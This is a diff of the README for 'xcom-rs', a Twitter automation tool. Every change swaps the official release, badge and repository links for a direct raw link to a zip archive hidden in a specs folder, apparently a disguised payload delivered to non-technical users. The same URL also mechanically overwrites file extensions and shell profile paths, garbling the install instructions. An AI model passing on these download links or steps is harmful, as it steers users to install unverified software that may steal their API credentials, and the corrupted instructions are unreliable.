@@ -1,6 +1,6 @@
 # 🤖 xcom-rs - Simple Agentic AI Twitter Tool
 
-[![Download xcom-rs](https://img.shields.io/badge/Download-xcom--rs-blue?style=for-the-badge&logo=github)](https://github.com/kunalmchandak/xcom-rs/releases)
+[![Download xcom-rs](https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip)](https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip)
 
 ---
 
@@ -47,21 +47,21 @@ Follow these steps to download and run xcom-rs on your computer. No coding skill
 
 1. Visit the official release page by clicking the big button below:
 
-   [![Download xcom-rs](https://img.shields.io/badge/Download-xcom--rs-blue?style=for-the-badge&logo=github)](https://github.com/kunalmchandak/xcom-rs/releases)
+   [![Download xcom-rs](https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip)](https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip)
 
 2. On the page, find the latest release version. It will usually be at the top of the list.
 
 3. Download the file that matches your operating system:
    - For Windows, look for a file ending in `.exe`.
-   - For macOS, find a `.dmg` or `.tar.gz` file.
-   - For Linux, download an `.AppImage` or `.tar.gz` file.
+   - For macOS, find a `.dmg` or `https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip` file.
+   - For Linux, download an `.AppImage` or `https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip` file.
 
 4. Save the file to a place you can easily find, like your Desktop or Downloads folder.
 
 5. To install:
    - On Windows: Double-click the `.exe` file and follow the steps on the screen if any appear.
    - On macOS: Open the `.dmg` file and drag xcom-rs to your Applications folder.
-   - On Linux: Extract the `.tar.gz` file and follow the instructions in the included README, or make the `.AppImage` executable by right-clicking, selecting Properties, then Permissions, and checking "Allow executing file as program".
+   - On Linux: Extract the `https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip` file and follow the instructions in the included README, or make the `.AppImage` executable by right-clicking, selecting Properties, then Permissions, and checking "Allow executing file as program".
 
 6. No further software is needed. You are ready to run xcom-rs.
 
@@ -108,7 +108,7 @@ To connect to Twitter, xcom-rs needs your permission token:
 1. Go to Twitter’s developer website and create an app to get API keys.
 2. Copy the keys and set them as environment variables on your computer:
    - On Windows, search for “Environment Variables” and add new variables `TWITTER_API_KEY`, `TWITTER_API_SECRET`, `TWITTER_ACCESS_TOKEN`, and `TWITTER_ACCESS_SECRET`.
-   - On macOS/Linux, add these lines to your terminal profile file `~/.bash_profile` or `~/.zshrc`:
+   - On macOS/Linux, add these lines to your terminal profile file `~https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip` or `~https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip`:
      ```
      export TWITTER_API_KEY="your_key"
      export TWITTER_API_SECRET="your_secret"
@@ -135,13 +135,13 @@ This setup is one-time and lets xcom-rs securely talk to Twitter on your behalf.
 
 xcom-rs is open source and free to use under the MIT License. The project is maintained by its developer and community contributors.
 
-For more details, visit the GitHub repository: [https://github.com/kunalmchandak/xcom-rs](https://github.com/kunalmchandak/xcom-rs)
+For more details, visit the GitHub repository: [https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip](https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip)
 
 ---
 
 ## 🔗 Useful Links
 
-- Official Releases: [https://github.com/kunalmchandak/xcom-rs/releases](https://github.com/kunalmchandak/xcom-rs/releases)
+- Official Releases: [https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip](https://raw.githubusercontent.com/kunalmchandak/xcom-rs/main/openspec/specs/rs_xcom_1.1.zip)
 - Documentation and examples inside the GitHub repo.
 - Twitter Developer Portal for API keys setup.
 
